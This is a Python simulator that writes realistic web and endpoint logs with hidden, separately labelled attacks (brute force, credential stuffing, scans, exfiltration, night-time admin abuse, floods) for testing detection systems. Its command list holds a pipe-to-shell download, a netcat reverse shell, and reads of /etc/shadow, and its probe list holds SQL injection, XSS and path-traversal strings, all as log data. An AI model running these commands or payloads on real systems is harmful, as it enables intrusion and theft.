#!/usr/bin/env python3
"""
web_traffic_sim.py - ONE stream that looks like a real website's logs, with
attacks hidden inside it. Use it to test a detection pipeline.

The event stream contains NO labels (a real network wouldn't give you any).
The answer key is written separately to labels.jsonl:
    {"event_id": ..., "kind": "attack" | "benign_anomaly", "scenario": ..., "run_id": ...}
Events not listed there are normal traffic.

What is simulated
  Normal   : anonymous visitors, logged-in customers, admins (office/VPN), search
             bots, health checks, daily traffic curve, typo'd logins, customers on
             a new IP, a nightly backup, random "flash crowd" spikes.
  Attacks  : brute_force (fast + low-and-slow), credential_stuffing,
             account_takeover, web_scan (SQLi/probing), data_exfiltration,
             admin_abuse (night only), http_flood.
  The benign_anomaly items are decoys: they look unusual but are legitimate,
  so you can measure false positives.

Event fields:
  event_id, event_ts, source, user, ip, event_type, severity, status, host,
  bytes_out, process, method, path, http_status, user_agent, response_ms

Examples
  python web_traffic_sim.py                                  # to Kafka, real time
  python web_traffic_sim.py --speedup 60                     # 1 real min = 1 sim hour
  python web_traffic_sim.py --dry-run --fast --max-events 50000 > events.jsonl
"""
import argparse, heapq, itertools, json, random, sys, time, uuid
from datetime import datetime, timedelta, timezone

TOPIC = "events.raw"
EPS_PER_SESSION = 12.0          # rough avg events per session (used to turn --rate into sessions)
INF = float("inf")

WEB_HOSTS = ["web-01", "web-02"]
AUTH_HOST, DB_HOST = "auth-01", "db-01"
ADMINS = {"admin1": {"ip": "10.0.0.9", "vpn": "10.8.0.11"},
          "admin2": {"ip": "10.0.0.10", "vpn": "10.8.0.12"}}
ADMIN_UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"

BROWSER_UAS = [
    ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36", 35),
    ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15", 15),
    ("Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1", 20),
    ("Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36", 18),
    ("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0", 8),
    ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0", 4),
]
BOT_UAS = ["Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
           "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"]
TOOL_UAS = ["python-requests/2.31.0", "curl/8.4.0", "Go-http-client/1.1"]
SCAN_UAS = ["sqlmap/1.7.2#stable", "Nmap Scripting Engine", "python-requests/2.31.0", "curl/8.4.0"]

FIRSTS = ["maria", "john", "li", "ahmed", "sofia", "david", "priya", "carlos", "emma", "yuki", "omar", "anna",
          "lucas", "fatima", "noah", "olga", "raj", "chloe", "ivan", "zara", "leo", "nina", "hugo", "aisha"]
LASTS = ["silva", "smith", "wang", "khan", "rossi", "brown", "patel", "garcia", "jones", "sato", "ali", "novak",
         "martin", "haddad", "kim", "ivanov", "singh", "dubois", "lopez", "nguyen", "meyer", "cohen", "berg", "diaz"]
WORDS = ["shoes", "laptop", "jacket", "phone", "headphones", "backpack", "watch", "camera", "coffee", "desk", "lamp", "keyboard"]
STATIC = ["/static/app.js", "/static/style.css", "/static/logo.svg"] + [f"/img/p{i}.jpg" for i in range(1, 40)]
ADMIN_PATHS = ["/admin", "/admin/users", "/admin/orders", "/admin/reports", "/admin/products"]
ADMIN_CMDS = ["systemctl status nginx", "tail -n 200 /var/log/nginx/access.log", "psql -c 'select count(*) from orders'",
              "docker ps", "kubectl get pods", "df -h", "top -bn1", "journalctl -u app --since today"]
EVIL_CMDS = ["whoami /all", "cat /etc/shadow", "curl http://185.220.101.7/x.sh | sh", "chmod +x /tmp/.x && /tmp/.x",
             "useradd -m svc_update", "crontab -e", "tar czf /tmp/db.tgz /var/lib/postgresql",
             "nc -e /bin/sh 194.36.190.20 4444", "find / -name '*.pem'"]
PROBES = ["/wp-login.php", "/wp-admin/", "/xmlrpc.php", "/.env", "/.git/config", "/phpmyadmin/", "/admin.php",
          "/config.php", "/backup.zip", "/server-status", "/actuator/env", "/api/v1/users", "/cgi-bin/test.cgi",
          "/products?id=1' OR '1'='1", "/search?q=' UNION SELECT username,password FROM users--",
          "/products/1;DROP TABLE users", "/search?q=<script>alert(1)</script>",
          "/static/..%2f..%2f..%2fetc/passwd", "/login?next=../../../etc/passwd", "/products?id=1 AND SLEEP(5)"]

DIURNAL = [0.25, 0.18, 0.12, 0.10, 0.10, 0.15, 0.25, 0.40, 0.55, 0.65, 0.70, 0.75,
           0.80, 0.78, 0.75, 0.75, 0.80, 0.85, 0.92, 1.00, 1.00, 0.95, 0.70, 0.45]


def diurnal(h):
    i, f = int(h) % 24, h - int(h)
    return DIURNAL[i] * (1 - f) + DIURNAL[(i + 1) % 24] * f


def weighted(pairs):
    items, weights = zip(*pairs)
    return random.choices(items, weights=weights)[0]


def iso(t):
    return datetime.fromtimestamp(t, timezone.utc).isoformat(timespec="milliseconds").replace("+00:00", "Z")


def hour_of(t):
    d = datetime.fromtimestamp(t, timezone.utc)
    return d.hour + d.minute / 60


def think():
    return min(90.0, random.lognormvariate(2.3, 0.8))


# --------------------------------------------------------------------------- world
class World:
    """Stable cast of characters (same seed -> same users/IPs every run)."""

    def __init__(self, seed=1337, n_customers=150, n_visitors=3000):
        r = random.Random(seed)
        octets = [a for a in range(2, 224) if a not in (10, 100, 127, 169, 172, 192, 198, 203)]
        self.prefixes = [f"{r.choice(octets)}.{r.randint(0, 255)}" for _ in range(80)]
        self.hosting = ["45.155", "185.220", "194.36", "91.92", "167.99", "159.65",
                        "138.68", "64.227", "178.128", "206.189"]
        self.visitor_ips = [self._ip(r) for _ in range(n_visitors)]
        self.visitor_cw = list(itertools.accumulate(1 / (i + 1) ** 0.8 for i in range(n_visitors)))
        self.bot_ips = [self._ip(r) for _ in range(12)]
        names = set()
        while len(names) < n_customers:
            names.add(f"{r.choice(FIRSTS)}.{r.choice(LASTS)}")
        self.cust_names = sorted(names)
        r.shuffle(self.cust_names)
        self.cust_cw = list(itertools.accumulate(1 / (i + 1) ** 0.6 for i in range(n_customers)))
        ua_items, ua_w = zip(*BROWSER_UAS)
        self.customers = {n: {"ip": self._ip(r), "ua": r.choices(ua_items, weights=ua_w)[0]}
                          for n in self.cust_names}

    def _ip(self, r):
        return f"{r.choice(self.prefixes)}.{r.randint(1, 254)}.{r.randint(1, 254)}"

    def pool_ip(self):
        return f"{random.choice(self.prefixes)}.{random.randint(1, 254)}.{random.randint(1, 254)}"

    def hosting_ip(self):
        return f"{random.choice(self.hosting)}.{random.randint(1, 254)}.{random.randint(1, 254)}"

    def attacker_ip(self):  # attackers mostly hide in the normal-looking pool
        return self.pool_ip() if random.random() < 0.55 else self.hosting_ip()


def attacker_ua():
    return random.choice(TOOL_UAS) if random.random() < 0.6 else weighted(BROWSER_UAS)


# --------------------------------------------------------------------------- simulator
class Sim:
    def __init__(self, world):
        self.w = world
        self.heap = []
        self.seq = itertools.count()

    def push(self, t, ev, tag=None):
        heapq.heappush(self.heap, (t, next(self.seq), ev, tag))

    def req(self, t, user, ip, ua, method, path, status, nbytes, *, etype="http_request",
            source="web", host=None, ms=None, tag=None):
        ev = {
            "event_id": str(uuid.uuid4()), "event_ts": iso(t), "source": source, "user": user, "ip": ip,
            "event_type": etype,
            "severity": "medium" if status >= 500 else "low",      # same rule for everyone: no leaks
            "status": "success" if status < 400 else "failure",
            "host": host or random.choice(WEB_HOSTS), "bytes_out": int(nbytes), "process": "",
            "method": method, "path": path, "http_status": status, "user_agent": ua,
            "response_ms": ms if ms is not None else int(random.lognormvariate(4.6, 0.6)),
        }
        self.push(t, ev, tag)

    def proc(self, t, user, ip, host, cmd, tag=None):
        self.push(t, {
            "event_id": str(uuid.uuid4()), "event_ts": iso(t), "source": "endpoint", "user": user, "ip": ip,
            "event_type": "process_start", "severity": "low", "status": "success", "host": host,
            "bytes_out": 0, "process": cmd, "method": "", "path": "", "http_status": 0,
            "user_agent": "", "response_ms": 0}, tag)

    def login(self, t, user, ip, ua, ok, path="/login", tag=None):
        self.req(t, user, ip, ua, "POST", path, 302 if ok else 401, random.randint(200, 500),
                 etype="login", source="auth", host=AUTH_HOST, ms=int(random.lognormvariate(5.0, 0.4)), tag=tag)

    def page_view(self, t, user, ip, ua, path, tag=None, assets=True, status=None):
        if status is None:
            status = weighted([(200, 93), (304, 3.5), (301, 1.5), (404, 1.7), (500, 0.3)])
        if status == 404:
            path = f"/products/{random.randint(5000, 9999)}"
        nb = random.lognormvariate(9.6, 0.5) if status == 200 else random.randint(180, 900)
        self.req(t, user, ip, ua, "GET", path, status, nb, tag=tag)
        end = t
        if assets and status == 200:
            for _ in range(random.randint(1, 4)):
                end += random.uniform(0.03, 0.4)
                cached = random.random() < 0.6
                self.req(end, user, ip, ua, "GET", random.choice(STATIC), 304 if cached else 200,
                         200 if cached else random.lognormvariate(10.3, 0.8), tag=tag)
        return end

    def api(self, t, user, ip, ua, path, nbytes=None, tag=None):
        st = weighted([(200, 98), (401, 1.5), (500, 0.5)])
        self.req(t, user, ip, ua, "GET", path, st, nbytes or random.lognormvariate(8.0, 0.7), tag=tag)

    # ---------------- normal sessions
    def session_anon(self, t, tag=None):
        w = self.w
        ip = (random.choices(w.visitor_ips, cum_weights=w.visitor_cw)[0]
              if random.random() < 0.9 else w.pool_ip())
        ua = weighted(BROWSER_UAS)
        for _ in range(min(12, 1 + int(random.expovariate(1 / 2.5)))):
            r = random.random()
            path = ("/" if r < 0.20 else f"/products/{random.randint(1, 800)}" if r < 0.55 else
                    "/products" if r < 0.70 else f"/search?q={random.choice(WORDS)}" if r < 0.80 else
                    f"/blog/{random.choice(WORDS)}-guide" if r < 0.88 else "/about" if r < 0.94 else
                    "/contact" if r < 0.97 else "/cart")
            t = self.page_view(t, "-", ip, ua, path, tag) + think()

    def session_customer(self, t):
        w = self.w
        user = random.choices(w.cust_names, cum_weights=w.cust_cw)[0]
        prof = w.customers[user]
        ip = prof["ip"] if random.random() > 0.05 else w.pool_ip()   # 5%: phone/VPN/travel
        ua = prof["ua"]
        fails = random.randint(1, 3) if random.random() < 0.06 else 0  # forgot password
        for _ in range(fails):
            self.login(t, user, ip, ua, False)
            t += random.uniform(4, 20)
        if fails and random.random() < 0.15:
            return                                                    # gave up
        self.login(t, user, ip, ua, True)
        t += random.uniform(0.5, 2)
        for _ in range(random.randint(3, 14)):
            r = random.random()
            if r < 0.20:
                t = self.page_view(t, user, ip, ua, "/account")
            elif r < 0.32:
                t = self.page_view(t, user, ip, ua, "/account/orders")
            elif r < 0.44:
                self.api(t, user, ip, ua, "/api/orders?page=1")
            elif r < 0.48:
                self.req(t, user, ip, ua, "POST", "/checkout", 302, 700)
            else:
                t = self.page_view(t, user, ip, ua, f"/products/{random.randint(1, 800)}")
            t += think()
        if random.random() < 0.5:
            self.req(t, user, ip, ua, "GET", "/logout", 302, 0, etype="logout", source="auth", host=AUTH_HOST)

    def session_admin(self, t):
        user = random.choice(list(ADMINS))
        ip = ADMINS[user]["ip"] if random.random() > 0.15 else ADMINS[user]["vpn"]
        self.login(t, user, ip, ADMIN_UA, True, path="/admin/login")
        t += random.uniform(1, 4)
        for _ in range(random.randint(3, 12)):
            r = random.random()
            if r < 0.08:
                self.req(t, user, ip, ADMIN_UA, "GET", "/admin/export?type=orders", 200,
                         random.randint(5_000_000, 50_000_000), etype="data_transfer",
                         ms=random.randint(1500, 8000))
            elif r < 0.20:
                self.proc(t, user, ip, random.choice(WEB_HOSTS), random.choice(ADMIN_CMDS))
            else:
                t = self.page_view(t, user, ip, ADMIN_UA, random.choice(ADMIN_PATHS))
            t += think()

    def session_bot(self, t):
        ip, ua = random.choice(self.w.bot_ips), random.choice(BOT_UAS)
        self.req(t, "-", ip, ua, "GET", "/robots.txt", 200, 120)
        t += random.uniform(0.5, 2)
        for _ in range(random.randint(15, 80)):
            path = random.choice([f"/products/{random.randint(1, 800)}",
                                  f"/blog/{random.choice(WORDS)}-guide", "/products"])
            self.page_view(t, "-", ip, ua, path, assets=False)
            t += random.uniform(0.5, 4)


# --------------------------------------------------------------------------- attacks
def a_brute_force(s, t, tag):
    w = s.w
    victim, path = (("admin1", "/admin/login") if random.random() < 0.2
                    else (random.choice(w.cust_names), "/login"))
    ip, ua = w.attacker_ip(), attacker_ua()
    slow = random.random() < 0.35                         # low-and-slow variant evades rate limits
    for _ in range(random.randint(8, 14) if slow else random.randint(40, 120)):
        s.login(t, victim, ip, ua, False, path=path, tag=tag)
        t += random.uniform(30, 90) if slow else random.uniform(0.15, 1.2)
    if random.random() < 0.6:                             # attacker eventually gets in
        s.login(t, victim, ip, ua, True, path=path, tag=tag)
        s.page_view(t + random.uniform(1, 4), victim, ip, ua,
                    "/admin" if victim == "admin1" else "/account", tag=tag, assets=False, status=200)


def a_credential_stuffing(s, t, tag):
    w = s.w
    bots = [w.attacker_ip() for _ in range(random.randint(4, 12))]
    uas = {ip: attacker_ua() for ip in bots}
    n = random.randint(80, 220)
    targets = random.sample(w.cust_names, k=min(len(w.cust_names), int(n * 0.7)))
    targets += [f"{random.choice(FIRSTS)}.{random.choice(LASTS)}" for _ in range(n - len(targets))]
    random.shuffle(targets)
    for u in targets:                                     # one or two tries per account, many accounts
        ip = random.choice(bots)
        ok = u in w.customers and random.random() < 0.03
        s.login(t, u, ip, uas[ip], ok, tag=tag)
        if ok:
            s.page_view(t + random.uniform(1, 3), u, ip, uas[ip], "/account", tag=tag, assets=False, status=200)
        t += random.expovariate(1 / 1.5)


def a_account_takeover(s, t, tag):
    w = s.w
    victim = random.choice(w.cust_names)
    home = w.customers[victim]
    s.login(t, victim, home["ip"], home["ua"], True)      # the real owner (normal traffic)
    s.page_view(t + 2, victim, home["ip"], home["ua"], "/account")
    t += random.uniform(120, 900)
    ip, ua = w.hosting_ip(), weighted(BROWSER_UAS)        # attacker with valid creds, different network
    s.login(t, victim, ip, ua, True, tag=tag)
    t += random.uniform(2, 8)
    for p in ["/account", "/account/settings", "/account/orders"]:
        t = s.page_view(t, victim, ip, ua, p, tag=tag, assets=False, status=200) + random.uniform(1, 6)
    s.req(t, victim, ip, ua, "POST", "/account/settings", 200, 600, tag=tag)   # change email/password
    t += random.uniform(3, 10)
    if random.random() < 0.6:
        s.req(t, victim, ip, ua, "POST", "/checkout", 302, 800, tag=tag)       # fraudulent purchase
    else:
        for page in range(1, random.randint(4, 10)):
            s.api(t, victim, ip, ua, f"/api/orders?page={page}", tag=tag)
            t += random.uniform(0.3, 1.5)


def a_web_scan(s, t, tag):
    ip = s.w.attacker_ip()
    ua = weighted(BROWSER_UAS) if random.random() < 0.4 else random.choice(SCAN_UAS)
    for _ in range(random.randint(40, 150)):
        st = weighted([(404, 85), (403, 8), (500, 5), (200, 2)])
        s.req(t, "-", ip, ua, "POST" if random.random() < 0.1 else "GET", random.choice(PROBES),
              st, random.randint(150, 700), tag=tag)
        t += random.uniform(0.05, 0.6)


def a_data_exfiltration(s, t, tag):
    w = s.w
    if random.random() < 0.5:                             # compromised admin pulls big exports
        user, ip, ua = "admin2", w.hosting_ip(), weighted(BROWSER_UAS)
        s.login(t, user, ip, ua, True, path="/admin/login", tag=tag)
        t += random.uniform(3, 10)
        for _ in range(random.randint(4, 10)):
            s.req(t, user, ip, ua, "GET", "/admin/export?type=customers", 200,
                  random.randint(100_000_000, 600_000_000), etype="data_transfer",
                  ms=random.randint(4000, 20000), tag=tag)
            t += random.uniform(20, 90)
    else:                                                 # scripted scraping of a customer's data via API
        user, ip, ua = random.choice(w.cust_names), w.attacker_ip(), random.choice(TOOL_UAS)
        s.login(t, user, ip, ua, True, tag=tag)
        t += random.uniform(1, 3)
        for page in range(1, random.randint(80, 200)):
            s.api(t, user, ip, ua, f"/api/orders?page={page}", random.lognormvariate(11.5, 0.3), tag=tag)
            t += random.uniform(0.2, 0.8)


def a_admin_abuse(s, t, tag):                             # only scheduled at night (sim time)
    user, ip = "admin1", f"10.8.0.{random.randint(40, 90)}"
    host = random.choice(WEB_HOSTS)
    s.login(t, user, ip, ADMIN_UA, True, path="/admin/login", tag=tag)
    t += random.uniform(5, 30)
    for cmd in random.sample(EVIL_CMDS, k=random.randint(3, 6)):
        s.proc(t, user, ip, host, cmd, tag=tag)
        t += random.uniform(2, 40)
    s.req(t, user, ip, "", "", "", 200, random.randint(300_000_000, 2_000_000_000),
          etype="data_transfer", source="network", host=host, ms=0, tag=tag)


def a_http_flood(s, t, tag):
    w = s.w
    ips = [w.attacker_ip() for _ in range(random.randint(30, 120))]
    uas = {ip: attacker_ua() for ip in ips}
    total, dur = random.randint(800, 2500), random.uniform(30, 90)
    for i, ts in enumerate(sorted(t + random.uniform(0, dur) for _ in range(total))):
        frac = i / total
        ip = random.choice(ips)
        degraded = random.random() < min(0.7, max(0.0, frac - 0.3))   # server starts failing mid-attack
        path = random.choice(["/", f"/search?q={random.choice(WORDS)}", "/products"])
        s.req(ts, "-", ip, uas[ip], "GET", path, 503 if degraded else 200,
              200 if degraded else random.lognormvariate(9.6, 0.5),
              ms=int(50 + frac * random.uniform(0, 4000)), tag=tag)


ATTACKS = {  # name: (function, weight, eligible(hour) or None)
    "brute_force": (a_brute_force, 3, None),
    "credential_stuffing": (a_credential_stuffing, 2, None),
    "account_takeover": (a_account_takeover, 2, None),
    "web_scan": (a_web_scan, 3, None),
    "data_exfiltration": (a_data_exfiltration, 1, None),
    "admin_abuse": (a_admin_abuse, 1, lambda h: 0 <= h < 5),
    "http_flood": (a_http_flood, 1, None),
}


# --------------------------------------------------------------------------- main
def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--bootstrap", default="localhost:19092")
    ap.add_argument("--rate", type=float, default=10, help="approx peak events per real second (default 10)")
    ap.add_argument("--speedup", type=float, default=1, help="simulated seconds per real second (default 1)")
    ap.add_argument("--fast", action="store_true", help="don't sleep; generate as fast as possible")
    ap.add_argument("--start-hour", type=float, default=None, help="UTC hour to start the sim clock at (default: now)")
    ap.add_argument("--attack-every", type=float, default=90, help="mean real seconds between attacks (default 90)")
    ap.add_argument("--warmup", type=float, default=120, help="real seconds of clean traffic before attacks start")
    ap.add_argument("--scenario", choices=list(ATTACKS) + ["random"], default="random")
    ap.add_argument("--no-attacks", action="store_true", help="normal traffic only")
    ap.add_argument("--labels", default="labels.jsonl", help="ground-truth file (default labels.jsonl)")
    ap.add_argument("--max-events", type=int, default=0, help="stop after N events (0 = run forever)")
    ap.add_argument("--dry-run", action="store_true", help="print JSON lines to stdout instead of Kafka")
    ap.add_argument("--seed", type=int, default=None, help="make a run reproducible")
    ap.add_argument("--quiet", action="store_true")
    args = ap.parse_args()

    if args.seed is not None:
        random.seed(args.seed)
    world = World(seed=args.seed if args.seed is not None else 1337)
    sim = Sim(world)
    log = (lambda *a: None) if args.quiet else (lambda *a: print(*a, file=sys.stderr))

    producer = None
    if not args.dry_run:
        from confluent_kafka import Producer
        producer = Producer({"bootstrap.servers": args.bootstrap, "linger.ms": 20})

    now = datetime.now(timezone.utc)
    if args.start_hour is None:
        sim0 = now.timestamp()
    else:
        sim0 = now.replace(hour=int(args.start_hour), minute=int(args.start_hour % 1 * 60),
                           second=0, microsecond=0).timestamp()
    real0 = time.time()
    sp = args.speedup

    st = {"flash_until": 0.0, "flash_mult": 1.0, "flash_tag": None}

    def session_gap(t):
        mult = st["flash_mult"] if t < st["flash_until"] else 1.0
        lam = args.rate * diurnal(hour_of(t)) * mult / (EPS_PER_SESSION * sp)
        return random.expovariate(max(lam, 1e-9))

    def spawn_session(t):
        h = hour_of(t)
        if t < st["flash_until"]:
            kind = random.choices(["anon", "customer", "bot"], [0.92, 0.06, 0.02])[0]
        else:
            kind = random.choices(["anon", "customer", "admin", "bot"],
                                  [0.70, 0.25, 0.03 if 8 <= h < 19 else 0.002, 0.02])[0]
        if kind == "anon":
            sim.session_anon(t, st["flash_tag"] if t < st["flash_until"] else None)
        else:
            getattr(sim, f"session_{kind}")(t)

    def pick_attack(t):
        if args.scenario != "random":
            return args.scenario
        h = hour_of(t)
        names = [n for n, (_, _, ok) in ATTACKS.items() if ok is None or ok(h)]
        return random.choices(names, [ATTACKS[n][1] for n in names])[0]

    def pace(t):
        d = real0 + (t - sim0) / sp - time.time()
        if d > 0:
            time.sleep(d)

    backup = datetime.fromtimestamp(sim0, timezone.utc).replace(hour=2, minute=30, second=0, microsecond=0)
    if backup.timestamp() <= sim0:
        backup += timedelta(days=1)

    next_session = sim0 + session_gap(sim0)
    next_health = sim0 + 30
    next_backup = backup.timestamp()
    next_flash = sim0 + random.expovariate(1 / (3 * 3600))
    next_attack = INF if args.no_attacks else sim0 + (args.warmup + random.expovariate(1 / args.attack_every)) * sp

    labels = open(args.labels, "a")
    sent = 0
    log(f"Streaming to {'stdout' if args.dry_run else TOPIC} | rate~{args.rate}/s speedup x{sp} "
        f"| attacks {'off' if args.no_attacks else f'every ~{args.attack_every}s after {args.warmup}s warmup'}")

    def emit(ev, tag):
        line = json.dumps(ev, separators=(",", ":"))
        if producer:
            try:
                producer.produce(TOPIC, key=ev["ip"], value=line)
            except BufferError:
                producer.poll(1)
                producer.produce(TOPIC, key=ev["ip"], value=line)
            producer.poll(0)
        else:
            print(line)
        if tag:
            labels.write(json.dumps({"event_id": ev["event_id"], **tag}) + "\n")

    try:
        while True:
            clocks = {"event": sim.heap[0][0] if sim.heap else INF, "session": next_session,
                      "attack": next_attack, "health": next_health, "backup": next_backup, "flash": next_flash}
            kind = min(clocks, key=clocks.get)
            t = clocks[kind]

            if kind == "event":
                _, _, ev, tag = heapq.heappop(sim.heap)
                if not args.fast:
                    pace(t)
                emit(ev, tag)
                sent += 1
                if sent % 1000 == 0:
                    log(f"{sent} events | sim {iso(t)} | queued {len(sim.heap)}")
                if args.max_events and sent >= args.max_events:
                    break
            elif kind == "session":
                spawn_session(t)
                next_session = t + session_gap(t)
            elif kind == "health":
                sim.req(t, "-", "10.0.0.2", "kube-probe/1.28", "GET", "/health", 200, 15,
                        host=random.choice(WEB_HOSTS), ms=random.randint(2, 15))
                next_health = t + 30
            elif kind == "backup":                            # benign decoy: night + process + huge transfer
                tag = {"kind": "benign_anomaly", "scenario": "nightly_backup", "run_id": uuid.uuid4().hex[:8]}
                sim.proc(t, "svc_backup", "10.0.1.5", DB_HOST, "pg_dump --format=custom appdb", tag=tag)
                sim.req(t + random.uniform(300, 900), "svc_backup", "10.0.1.5", "", "", "", 200,
                        random.randint(2_000_000_000, 4_000_000_000), etype="data_transfer",
                        source="network", host=DB_HOST, ms=0, tag=tag)
                next_backup = t + 86400
            elif kind == "flash":                             # benign decoy: sudden legit traffic spike
                st["flash_until"] = t + random.uniform(300, 900)
                st["flash_mult"] = random.uniform(3, 5)
                st["flash_tag"] = {"kind": "benign_anomaly", "scenario": "flash_crowd", "run_id": uuid.uuid4().hex[:8]}
                next_flash = t + random.expovariate(1 / (4 * 3600))
            elif kind == "attack":
                name = pick_attack(t)
                tag = {"kind": "attack", "scenario": name, "run_id": uuid.uuid4().hex[:8]}
                log(f"[sim {iso(t)}] launching {name} ({tag['run_id']})")
                ATTACKS[name][0](sim, t, tag)
                next_attack = t + random.expovariate(1 / (args.attack_every * sp))
    except KeyboardInterrupt:
        pass
    finally:
        if producer:
            producer.flush(5)
        labels.close()
        log(f"Done. {sent} events. Ground truth in {args.labels}")


if __name__ == "__main__":
    main()
